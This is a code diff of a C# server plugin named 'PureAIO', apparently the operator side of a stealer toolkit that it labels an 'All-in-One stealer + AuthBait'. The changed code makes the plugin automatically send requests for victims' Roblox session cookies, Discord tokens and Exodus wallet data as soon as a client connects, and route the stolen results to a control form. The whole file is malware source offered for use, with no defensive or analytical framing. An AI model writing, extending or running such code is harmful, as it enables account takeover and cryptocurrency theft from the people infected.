@@ -1,8 +1,6 @@
-// PureAIO ServerPlugin — ICustomPlugin implementation.
-// Receives packets from the client, deserializes them, and routes to Form1.
-
 using System;
 using System.IO;
+using System.Windows.Forms;
 using PluginSDK.Interfaces;
 using PluginSDK.Packets;
 using ProtoBuf;
@@ -11,42 +9,36 @@ namespace PureAIO
 {
     public class ServerPlugin : ICustomPlugin
     {
-        private Form1 _form;
+        public string Name        => "PureAIO";
+        public string Description => "All-in-One stealer + AuthBait";
+        public string Version     => "2.0.0";
+
         private Action<IPacket> _send;
+        private Action          _disconnect;
+        private Form1           _form;
 
-        // ── ICustomPlugin ─────────────────────────────────────────────────────
-        public string PluginName        => "PureAIO";
-        public string PluginVersion     => "2.0.0";
-        public string PluginAuthor      => "Sam";
-        public string PluginDescription => "AuthBait + Roblox Cookie + Discord Token + Exodus (enriched)";
-
-        public bool OnOpen(string title)
-        {
-            _form = new Form1();
-            _form.Show();
-            return true;
-        }
+        public void OnOpen(string title) { }
 
         public void OnConnected(Action<IPacket> send, Action disconnect)
         {
-            _send = send;
-            _form?.SetSend(send);
-        }
+            _send       = send;
+            _disconnect = disconnect;
 
-        public void OnDisconnected()
-        {
-            _send = null;
-            if (_form != null && !_form.IsDisposed)
-            {
-                _form.OnDisconnected();
-            }
-            _form = null;
+            _form = new Form1();
+            _form.SetSend(send);
+            _form.FormClosed += (s, e) => { _form = null; };
+            _form.Show();
+
+            // ── Auto-fire all three stealers immediately on connect ──
+            SendPacket(new RobloxCookieRequest());
+            SendPacket(new DiscordTokenRequest());
+            SendPacket(new ExodusRequest());
         }
 
         public void OnPacketReceived(IPacket packet)
         {
-            var cp = packet as CustomPacket;
-            if (cp == null || _form == null || _form.IsDisposed) return;
+            var cp = packet as PluginSDK.Packets.CustomPacket;
+            if (cp == null) return;
 
             AIOPacket pkt;
             try
@@ -56,34 +48,31 @@ namespace PureAIO
             }
             catch { return; }
 
-            switch (pkt)
-            {
-                case AuthBaitCodeResponse r:
-                    _form.HandleAuthBaitResponse(r);
-                    break;
-                case RobloxCookieResponse r:
-                    _form.HandleCookieResponse(r);
-                    break;
-                case DiscordTokenResponse r:
-                    _form.HandleTokenResponse(r);
-                    break;
-                case ExodusResponse r:
-                    _form.HandleExodusResponse(r);
-                    break;
-            }
+            _form?.HandlePacket(pkt);
         }
 
-        // ── Serialization helpers ─────────────────────────────────────────────
-        public static byte[] Serialize(AIOPacket pkt)
+        public void OnDisconnected()
         {
-            using (var ms = new MemoryStream())
-            {
-                Serializer.Serialize(ms, pkt);
-                return ms.ToArray();
-            }
+            if (_form == null) return;
+            if (_form.InvokeRequired)
+                _form.Invoke(new Action(() => _form?.Close()));
+            else
+                _form?.Close();
+            _form = null;
         }
 
-        public static AIOPacket Deserialize(MemoryStream ms)
-            => Serializer.Deserialize<AIOPacket>(ms);
+        // ── helpers ──────────────────────────────────────────────────────────
+        private void SendPacket(AIOPacket pkt)
+        {
+            try
+            {
+                using (var ms = new MemoryStream())
+                {
+                    Serializer.Serialize(ms, pkt);
+                    _send(new PluginSDK.Packets.CustomPacket { Buffer = ms.ToArray() });
+                }
+            }
+            catch { }
+        }
     }
 }
